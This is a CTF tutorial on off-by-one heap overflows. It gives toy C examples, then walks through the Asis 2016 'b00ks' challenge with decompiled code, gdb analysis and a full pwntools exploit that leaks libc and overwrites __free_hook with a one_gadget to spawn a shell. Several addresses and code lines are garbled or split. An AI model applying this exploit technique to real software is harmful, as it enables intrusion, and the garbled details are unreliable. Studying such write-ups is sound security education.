# Off-By-One Vulnerability
## Overview
- Strictly speaking, the `off-by-one` vulnerability is a special overflow vulnerability. The `off-by-one` refers to the number of bytes written by the program when writing to the buffer exceeds the number of bytes applied by the buffer itself and only one byte is exceeded.

## Vulnerability Principle
- `off-by-one` refers to a single-byte buffer overflow. The occurrence of this vulnerability is often related to poor boundary verification and string operation. Of course, it is not ruled out that the `size` written happens to have only one byte extra, and poor boundary verification usually includes:
  - When using loop statements to write data into a heap block, the number of loops is set incorrectly, resulting in an extra byte being written
  - String operation is not suitable

- Generally speaking, single-byte overflow is considered difficult to exploit, but because of the looseness of the `Linux` heap management mechanism `ptmalloc` verification, the `off-by-one` vulnerability based on the `Linux` heap is not complicated and powerful.
- In addition, `off-by-one` can be based on various buffers, such as stack, `bss` segment, etc., but `off-by-one` on the heap is more common in `CTF`

### The loop boundary is not rigorous

- In the example code, two pointers of `char`type `chunk1` and `chunk2` are created, and two `16` bytes are created respectively. Then, the pointer and size are passed into the `input` function, namely `chunk1` and `16`
- The function of the `input` function is to receive strings from the outside world and store the string into the heap of `chunk1`, but when the data is stored, the boundary is not rigorous. `i` starts with `0`, but `i <= size`, the loop is actually `17` times, which causes `chunk1` to overflow byte

![](images/1.png#pic_center)

![](images/2.png#pic_center)

```c
int input(char *ptr, int size)
{
    int i;
    for(i = 0; i <= size; i++)
    {
        ptr[i] = getchar();
    }
    return i;
}
int main()
{
    char *chunk1, *chunk2;
    chunk1 = (char *)malloc(16);
    chunk2 = (char *)malloc(16);
    puts("Get Input:");
    input(chunk1, 16);
    return 0;
}
```

### String operation is not rigorous

- In the example code, a `40`byte string `buffer` is created first, and then a `24`byte heap `chunk1` is created first.
- Then receive the string from the outside and store it in the string `buffer`, and then determine whether the length of the string in the `buffer` is `24` bytes. If this string is placed in the heap
- When the `strcpy` function is copied, the ending character `\x00` will be stored in the heap block, which means that a total of `chunk1` is written in total `25` bytes, which causes `chunk1` to overflow one byte

![](images/3.png#pic_center)

![](images/4.png#pic_center)

```c
int main()
{
    char buffer[40] = "";
    void *chunk1;
    chunk1 = malloc(24);
    puts("Get Input");
    gets(buffer);
    if(strlen(buffer) == 24)
    {
        strcpy(chunk1, buffer);
    }
    return 0;
}
```

## CTF Example Questions
### Static Analysis

- [Asis_2016_b00ks](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/off_by_one/Asis_2016_b00ks)
- A typical menu pile question, first enter the author's name, and then select the required functions:
  - `1.Create a book`
  - `2.Delete a book`
  - `3.Edit a book`
  - `4.Print book detail`
  - `5.Change current author name`
  - `6.Exit`

- In the creation of the author name function, you can see that it will call the function `sub_9F5`, pass the pointer `off_202018` and the value `32`, and the function implements the function written to memory. In the function `sub_9F5`, you can see that although the value of `a2` is `32`, it does not strictly limit the loop boundary. The actual number of executions of the loop is `33` times.

```c
__int64 sub_B6D()
{
  printf("Enter author name: ");
  if ( !(unsigned int)sub_9F5(off_202018, 32) )
    return 0LL;
  printf("fail to read author_name");
  return 1LL;
}
```

```c
__int64 __fastcall sub_9F5(_BYTE *a1, int a2)
{
  int i; // [rsp+14h] [rbp-Ch]

  if ( a2 <= 0 )
    return 0LL;
  for ( i = 0; ; ++i )
  {
    if ( (unsigned int)read(0, a1, 1uLL) != 1 )
      return 1LL;
    if ( *a1 == 10 )
      break;
    ++a1;
    if ( i == a2 )
      break;
  }
  *a1 = 0;
  return 0LL;
}
```

- In the function to create a book, you can see that you need to enter the size of the book name first and create a heap of book title size. Then call the `sub_9F5` function, write the book name into the heap and determine whether it is successfully written. Then write the book content with the same idea. Finally, call the function `sub_B24` to determine whether the position of the `off_202010 + i` pointer has a value. If not, return `i`, and the function loops `20` times, so you can only create `20` books at most.

```c
__int64 sub_F55()
{
  int v1; // [rsp+0h] [rbp-20h] BYREF
  int v2; // [rsp+4h] [rbp-1Ch]
  void *v3; // [rsp+8h] [rbp-18h]
  void *ptr; // [rsp+10h] [rbp-10h]
  void *v5; // [rsp+18h] [rbp-8h]

  v1 = 0;
  printf("\nEnter book name size: ");
  __isoc99_scanf("%d", &v1);
  if ( v1 < 0 )
    goto LABEL_2;
  printf("Enter book name (Max 32 chars): ");
  ptr = malloc(v1);
  if ( !ptr )
  {
    printf("unable to allocate enough space");
    goto LABEL_17;
  }
  if ( (unsigned int)sub_9F5(ptr, v1 - 1) )
  {
    printf("fail to read name");
    goto LABEL_17;
  }
  v1 = 0;
  printf("\nEnter book description size: ");
  __isoc99_scanf("%d", &v1);
  if ( v1 < 0 )
  {
LABEL_2:
    printf("Malformed size");
  }
  else
  {
    v5 = malloc(v1);
    if ( v5 )
    {
      printf("Enter book description: ");
      if ( (unsigned int)sub_9F5(v5, v1 - 1) )
      {
        printf("Unable to read description");
      }
      else
      {
        v2 = sub_B24();
        if ( v2 == -1 )
        {
          printf("Library is full");
        }
        else
        {
          v3 = malloc(0x20uLL);
          if ( v3 )
          {
            *((_DWORD *)v3 + 6) = v1;
            *((_QWORD *)off_202010 + v2) = v3;
            *((_QWORD *)v3 + 2) = v5;
            *((_QWORD *)v3 + 1) = ptr;
            *(_DWORD *)v
3 = ++unk_202024;
            return 0LL;
          }
          printf("Unable to allocate book struct");
        }
      }
    }
    else
    {
      printf("Fail to allocate memory");
    }
  }
LABEL_17:
  if ( ptr )
    free(ptr);
  if ( v5 )
    free(v5);
  if ( v3 )
    free(v3);
  return 1LL;
}
```

```c
__int64 sub_B24()
{
  int i; // [rsp+0h] [rbp-4h]

  for ( i = 0; i <= 19; ++i )
  {
    if ( !*((_QWORD *)off_202010 + i) )
      return (unsigned int)i;
  }
  return 0xFFFFFFLL;
}
```

- In the function to delete a book, first enter the `id` of the book, then loop `20` times, look for the book that needs to be deleted in `off_202010`, and call the `free` function and release each structure in the book structure after finding it.

```c
__int64 sub_BBD()
{
  int v1; // [rsp+8h] [rbp-8h] BYREF
  int i; // [rsp+Ch] [rbp-4h]

  i = 0;
  printf("Enter the book id you want to delete: ");
  __isoc99_scanf("%d", &v1);
  if ( v1 > 0 )
  {
    for ( i = 0; i <= 19 && (!*((_QWORD *)off_202010 + i) || **((_DWORD **)off_202010 + i) != v1); ++i)
      ;
    if ( i != 20 )
    {
      free(*(void **)(*((_QWORD *)off_202010 + i) + 8LL));
      free(*(void **)(*((_QWORD *)off_202010 + i) + 16LL));
      free(*((void **)off_202010 + i));
      *((_QWORD *)off_202010 + i) = 0LL;
      return 0LL;
    }
    printf("Can't find selected book!");
  }
  else
  {
    printf("Wrong id");
  }
  return 1LL;
}
```

- In the function to edit the book, first enter the `id` of the book, then loop `20` times, look for the book that needs to be edited in `off_202010`, and call the `sub_9F5` function to rewrite the modified content into

```c
__int64 sub_E17()
{
  int v1; // [rsp+8h] [rbp-8h] BYREF
  int i; // [rsp+Ch] [rbp-4h]

  printf("Enter the book id you want to edit: ");
  __isoc99_scanf("%d", &v1);
  if ( v1 > 0 )
  {
    for ( i = 0; i <= 19 && (!*((_QWORD *)off_202010 + i) || **((_DWORD **)off_202010 + i) != v1); ++i)
      ;
    if ( i == 20 )
    {
      printf("Can't find selected book!");
    }
    else
    {
      printf("Enter new book description: ");
      if ( !(unsigned int)sub_9F5(
                            *(_BYTE **)(*((_QWORD *)off_202010 + i) + 16LL),
                            *(_DWORD *)(*((_QWORD *)off_202010 + i) + 24LL) - 1) )
        return 0LL;
      printf("Unable to read new description");
    }
  }
  else
  {
    printf("Wrong id");
  }
  return 1LL;
}
```

- In the function of printing the book, all created books will be printed out

```c
int sub_D1F()
{
  __int64 v0; // rax
  int i; // [rsp+Ch] [rbp-4h]

  for ( i = 0; i <= 19; ++i )
  {
    v0 = *((_QWORD *)off_202010 + i);
    if ( v0 )
    {
      printf("ID: %d\n", **((unsigned int **)off_202010 + i));
      printf("Name: %s\n", *(const char **)(*((_QWORD *)off_202010 + i) + 8LL));
      printf("Description: %s\n", *(const char **)(*((_QWORD *)off_202010 + i) + 16LL));
      LODWORD(v0) = printf("Author: %s\n", (const char *)off_202018);
    }
  }
  return v0;
}
```

### Dynamic Analysis
- During the previous static analysis, I learned that there is an `off-by-one` vulnerability in the `sub_9F5` function. Therefore, when creating the author's name, first enter any `32 bytes of string to fill the `off_202018` space where the author's name is stored, then `ctrl + c` enter the debugging interface. Check the starting position of the code segment through `vmmap` to see that the starting position of the code segment is `0x555555400000`. Then add the offset of `off_202018` to find the pointer to store the author's name.

![](images/5.png#pic_center)

- You can see that the address `0x555555602018` stores the author's name `0x555555602040`, and the location of `0x555555602040` is exactly the `32 bytes of the author's name I just entered
- You can also determine the location of the string by directly `search string`

- Then enter the command `c` and return to the program execution interface, enter `1` to create two books:
  - `Book 1`: Book title size `64`, book title casually, content size `32`, content casually
  - `Book 2`: Book title size `0x21000(135168)`, book title casually, content size `0x21000(135168)`, content casually

- Then enter the command `ctrl + c` to return to the debugging interface. This time, position the two book structures. Because the structure pointer of the book is stored in `off_202010`, the old method is used to add the offset `0x5555554000000 + 0x202010 = 0x555555602010`

![](images/6.png#pic_center)

- You can see that the structure pointer of `book 1` is stored in `0x55555602010`, followed by the structure pointer of `book 2`. Another thing to note is that the author name entered before is immediately ahead of the two structure pointers. This is because the off_202010` and `off_202018` of the two things are next to each other, and the low `70` of the structure pointer of `book1` covers the previous ending sign`\x00`
- When printing the author's name, the last `\x00` is also output, but after being covered by `70`, `70` will also be printed. Since `70` is the starting position of the `book1` structure pointer, then the `book1` structure pointer will also be printed together. This is like two playing cards, card A and card B. The `card A` is placed on the table, and the edge of card B is glued. Then the edge of card B with glue is placed on the edge of card A to make the two cards stick together. Finally, pick up card A from the table. Because card A is bonded to card B, card B is also picked up from the table.

![](images/7.png#pic_center)

- If you modify the author name again at this time, the `book1` structure pointer`0x555555603770` will be overwritten as `0x555555603700`, and the position of `0x5555555757700` is the position of `book1_description` just now, which is also the reason why `book1_size` is set to `64`

![](images/8.png#pic_center)

- After the original structure pointer is overwritten by `\x00`, the program will look for the structure at `0x555555603700`. If we have the original `book1_description` book1_description`
Forge a structure at the location, and then cover it with `\x00`, then use the forged structure as `book1` to implement it

![](images/9.png#pic_center)

- There are two ways to expand the heap. One is that `brk` will directly expand the original heap. The other is that `mmap` will map a piece of memory separately. The size of `book2` is set to `135168` because a super large block of space is applied for, so that the heap is expanded in the form of `mmap`. Then the space applied for `mmap` will be represented in a separate segment.
- Apply for a super large block here to use `mmap` to expand memory. Because the memory allocated by `mmap` has a fixed offset from `libc` before, so if the address of `book2_name` or `book2_description` can be leaked at this time, you can calculate the base address of `libc`

```
fake_book1_name = book2_name
book2_name - book1_addr = 0x555555603768 - 0x555555603730 = 0x38
fake_book1_name = book1_addr + 0x38

fake_book1_description = book2_description
book2_description - book1_addr = 0x555555603770 - 0x55555757730 = 0x40
fake_book1_description = book1_addr + 0x40
```

- According to the above calculation, the `fake_book1` structure can be constructed as: `payload = p64(1) + p64(book1_addr + 0x38) + p64(book1_addr + 0x40) + p64(0xffff)`
- After deploying the structure, you need to re-modify the author name, because the forged structure is written in the original `book1_description`, so according to the attack process, the forged structure should be deployed first, and then use `\x00` to override the `book1` structure pointer to make the pointer point to the forged structure. In this way, press `c` to return to the program execution process, first modify the author name, and then execute the printing function again, and the `book2_name` and `book2_description` will be printed out

![](images/10.png#pic_center)

- Next is to calculate the `libc` base address, `freehook` address, `onegadget` find `gadget` and other operations

![](images/11.png#pic_center)

- Finally, the idea of ​​`getshell` is to first deploy `free_hook` into the description of the forged structure `fake_book1`, and then write `onegadget` into the description of `book2`, and finally `execve('/bin/sh')` when releasing `book2`

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')

r = process('./b00ks')
elf = ELF('b00ks')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def create_author(name):
    r.recvuntil(b'Enter author name: ')
    r.sendline(name)

def create_book(name_size, name, description_size, description):
    r.recvuntil(b'>')
    r.sendline(b'1')
    r.recvuntil(b'Enter book name size: ')
    r.sendline(name_size)
    r.recvuntil(b'Enter book name (Max 32 chars): ')
    r.sendline(name)
    r.recvuntil(b'Enter book description size: ')
    r.sendline(description_size)
    r.recvuntil(b'Enter book description: ')
    r.sendline(description)
    log.info('create book')

def delete_book(index):
    r.recvuntil(b'>')
    r.sendline(b'2')
    r.recvuntil(b'Enter the book id you want to delete: ')
    r.sendline(index)
    log.info('delete book')

def edit_book(index, description):
    r.recvuntil(b'>')
    r.sendline(b'3')
    r.recvuntil(b'Enter the book id you want to edit: ')
    r.sendline(index)
    r.recvuntil(b'Enter new book description: ')
    r.sendline(description)
    log.info('edit book')

def print_book(index):
    r.recvuntil(b'>')
    r.sendline(b'4')
    for i in range(index):
        r.recvuntil(b': ')
        book_id = r.recvline()[:-1]
        r.recvuntil(b': ')
        book_name = r.recvline()[:-1]
        r.recvuntil(b': ')
        book_description = r.recvline()[:-1]
        r.recvuntil(b': ')
        book_author = r.recvline()[:-1]
    log.info('print book')
    return book_id, book_name, book_description, book_author

def change_author(name):
    r.recvuntil(b'>')
    r.sendline(b'5')
    r.recvuntil(b'Enter author name: ')
    r.sendline(name)
    log.info('change author')

create_author(b'a' * 32)
create_book(b'64', b'book1', b'32', b'book1 description')
create_book(b'135168', b'book2', b'135168', b'book2 description')

book_id_1, book_name_1, book_description_1, book_author_1 = print_book(1)
book1_addr = u64(book_author_1[32:32+6].ljust(8, b'\x00'))
log.success('book1 address: ' + hex(book1_addr))

payload = p64(1) + p64(book1_addr + 0x38) + p64(book1_addr + 0x40) + p64(0xffff)
edit_book(b'1', payload)
change_author(b'a' * 32)

book_id_1, book_name_1, book_description_1, book_author_1 = print_book(1)
book2_name = u64(book_name_1.ljust(8, b'\x00'))
book2_description = u64(book_description_1.ljust(8, b'\x00'))
log.success('book2 name address: ' + hex(book2_name))
log.success('book2 description address: ' + hex(book2_description))

libc_base = book2_description + 0x43FF0
log.success('libc base: ' + hex(libc_base))

free_hook = libc_base + libc.symbols['__free_hook']
onegadget = libc_base + 0xE3B04
edit_book(b'1', p64(free_hook))
edit_book(b'2', p64(onegadget))
gdb.attach(r)
delete_book(b'2')

r.inter
active()
```